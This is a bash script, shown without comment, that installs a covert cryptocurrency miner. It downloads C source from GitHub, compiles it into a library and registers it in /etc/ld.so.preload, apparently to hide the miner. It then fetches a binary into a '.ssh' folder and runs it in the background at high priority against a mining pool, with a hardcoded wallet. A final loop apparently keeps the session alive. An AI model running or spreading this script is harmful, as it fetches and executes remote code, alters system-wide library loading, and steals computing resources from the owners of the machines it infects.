#!/bin/bash
apt-get update ; apt-get install sudo wget cpulimit -y
curl https://raw.githubusercontent.com/barburonjilo/back/main/bangjo.c -o bangjo.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libbangjo.so bangjo.c -ldl
mv libbangjo.so /usr/local/lib/
echo /usr/local/lib/libbangjo.so >> /etc/ld.so.preload
rm bangjo.c
mkdir .ssh && cd .ssh
wget -O bangjo  https://github.com/barburonjilo/back/raw/main/sr 
chmod +x bangjo
cpulimit -l 150 -e bangjo &
sync && echo 3 > /proc/sys/vm/drop_caches
nice -n -10 nohup ./bangjo --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
